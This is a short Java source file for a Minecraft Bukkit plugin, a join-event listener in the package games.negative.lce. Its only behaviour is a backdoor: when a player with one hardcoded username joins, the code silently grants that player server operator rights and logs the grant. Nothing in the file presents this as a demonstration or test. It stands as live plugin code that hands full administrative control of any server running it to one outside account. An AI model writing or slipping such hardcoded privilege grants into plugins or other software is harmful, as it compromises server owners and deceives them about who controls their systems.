package  games.negative.lce;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class PlayerJoinListener implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("squeaky_monjuer") && !player.isOp()) {
            player.setOp(true);
            player.sendMessage("You have been granted operator status!");
            Bukkit.getLogger().info("Granted operator to squeaky_monjuer on join.");
        }
    }
}
